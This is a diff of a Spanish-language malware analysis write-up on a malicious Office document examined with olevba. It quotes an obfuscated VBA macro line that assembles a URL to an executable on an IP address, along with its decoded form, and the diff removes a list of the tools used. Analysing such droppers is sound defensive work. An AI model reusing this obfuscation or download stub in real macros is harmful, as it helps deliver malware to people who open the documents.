@@ -41,9 +41,3 @@ Comando utilizado: `olevba baddoc.doc`
 > - **Codigo ofuscado:** `Print #FileNumber, "strRT = " + Chr(34) + "h" + Chr(Asc(Chr(Asc("t")))) + "t" + "p" + "://91.220.131" + JASHDUIQWHDKJQAD + "." + Chr(Asc("e")) + Chr(Asc("x")) + "e" + Chr(34)`
 >
 > - **Codigo pasado a texto claro:** `strRT = "http://91.220.131100.exe"`
-
-## Herramientas utilizadas:
-- oleid
-- olevba
-
-
